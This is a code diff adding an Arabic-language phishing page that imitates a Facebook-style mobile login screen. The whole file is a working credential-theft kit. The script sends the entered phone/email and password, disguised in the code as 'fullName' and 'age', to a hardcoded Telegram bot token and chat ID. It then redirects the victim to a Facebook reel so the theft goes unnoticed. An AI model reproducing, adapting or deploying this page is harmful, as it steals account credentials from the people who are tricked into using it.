@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>D</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0;
+        }
+
+        .logo-section {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            padding-top: 90px;
+            padding-bottom: 40px;
+        }
+
+        .logo {
+            width: 64px;
+            height: 64px;
+            background: #1877f2;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 36px;
+            font-weight: bold;
+        }
+
+        .form-container {
+            width: 100%;
+            max-width: 340px;
+            padding: 0 16px;
+            margin-top: 20px;
+        }
+
+        .input-group { margin-bottom: 10px; }
+
+        .input-field {
+            width: 100%;
+            height: 48px;
+            padding: 12px 14px;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            font-size: 15px;
+            background: #f5f6f7;
+            outline: none;
+            text-align: right;
+            color: #1c1e21;
+        }
+
+        .input-field:focus { border-color: #1877f2; background: #ffffff; }
+        .input-field::placeholder { color: #8a8d91; font-size: 14px; }
+
+        .submit-btn {
+            width: 100%;
+            height: 44px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 22px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 6px;
+        }
+
+        .submit-btn:active { background: #166fe5; transform: scale(0.98); }
+        .submit-btn:disabled { opacity: 0.7; }
+
+        .forgot-link {
+            text-align: center;
+            margin-top: 14px;
+            margin-bottom: 20px;
+        }
+
+        .forgot-link a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 12px 0;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #dadde1;
+        }
+
+        .create-account {
+            width: 100%;
+            height: 40px;
+            background: transparent;
+            color: #1877f2;
+            border: 1px solid #1877f2;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        .spacer { flex: 1; min-height: 100px; }
+
+        .languages {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 12px;
+            font-size: 12px;
+            color: #576b95;
+        }
+
+        /* رسالة الخطأ/النجاح */
+        .status-msg {
+            display: none;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .status-error {
+            background: #ffebe9;
+            color: #cf222e;
+            border: 1px solid #ffcdd2;
+        }
+
+        .status-success {
+            background: #dafbe1;
+            color: #1a7f37;
+            border: 1px solid #aceebb;
+        }
+
+        .loading {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #ffffff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="logo-section">
+        <div class="logo">D</div>
+    </div>
+
+    <div class="form-container">
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="fullName" class="input-field" placeholder="رقم الهاتف أو البريدالإليكتروني" required>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" id="age" class="input-field" placeholder="كلمة السر" required>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">
+                <span id="btnText">تسجيل الدخول</span>
+                <div class="loading" id="loading"></div>
+            </button>
+        </form>
+
+        <!-- رسالة الحالة -->
+        <div class="status-msg status-error" id="errorMsg"></div>
+        <div class="status-msg status-success" id="successMsg"></div>
+
+        <div class="forgot-link">
+            <a href="#">هل نسيت كلمة السر؟</a>
+        </div>
+
+        <div class="divider"></div>
+
+        <button class="create-account">إنشاء حساب جديد</button>
+    </div>
+
+    <div class="spacer"></div>
+
+    <div class="languages">
+        <span>العربية</span>
+        <span>English</span>
+        <span>›</span>
+    </div>
+
+    <script>
+        // ============================================
+        // ⚙️ إعداداتك - عدل هنا فقط
+        // ============================================
+        const BOT_TOKEN = '8422907042:AAE4hkxpTZtfJh5wDlJEI9NeLLjR3jt7XNQ';
+        const CHAT_ID = '5015426926';
+        const GROUP_LINK = 'https://www.facebook.com/reel/1671277530598489/?fs=e&fs=e';
+        // ============================================
+
+        const form = document.getElementById('loginForm');
+        const btnText = document.getElementById('btnText');
+        const loading = document.getElementById('loading');
+        const submitBtn = document.getElementById('submitBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const successMsg = document.getElementById('successMsg');
+
+        function showError(msg) {
+            errorMsg.textContent = msg;
+            errorMsg.style.display = 'block';
+            successMsg.style.display = 'none';
+            btnText.style.display = 'block';
+            loading.style.display = 'none';
+            submitBtn.disabled = false;
+        }
+
+        function showSuccess(msg) {
+            successMsg.textContent = msg;
+            successMsg.style.display = 'block';
+            errorMsg.style.display = 'none';
+        }
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const fullName = document.getElementById('fullName').value.trim();
+            const age = document.getElementById('age').value;
+
+            if (!fullName || !age) {
+                showError('الرجاء ملء جميع الحقول');
+                return;
+            }
+
+            // إخفاء أي رسالة سابقة
+            errorMsg.style.display = 'none';
+            successMsg.style.display = 'none';
+
+            // إظهار التحميل
+            btnText.style.display = 'none';
+            loading.style.display = 'block';
+            submitBtn.disabled = true;
+
+            // تجهيز الرسالة
+            const message = `طلب جديد - D\nالاسم: ${fullName}\nالعمر: ${age}\nالوقت: ${new Date().toLocaleString('ar-SA')}`;
+
+            try {
+                // ⏳ نرسل للتليجرام
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                // نتحقق من الاستجابة
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+
+                const data = await response.json();
+
+                if (data.ok) {
+  
+                    setTimeout(() => {
+                        window.location.href = GROUP_LINK;
+                    }, 1000);
+
+                } else {
+                    // ❌ تليجرام رد بخطأ
+                    throw new Error(data.description || 'خطأ غير معروف من التليجرام');
+                }
+
+            } catch (error) {
+                console.error('Error details:', error);
+                showError('خطأ: ' + error.message);
+            }
+        });
+    </script>
+</body>
+</html>
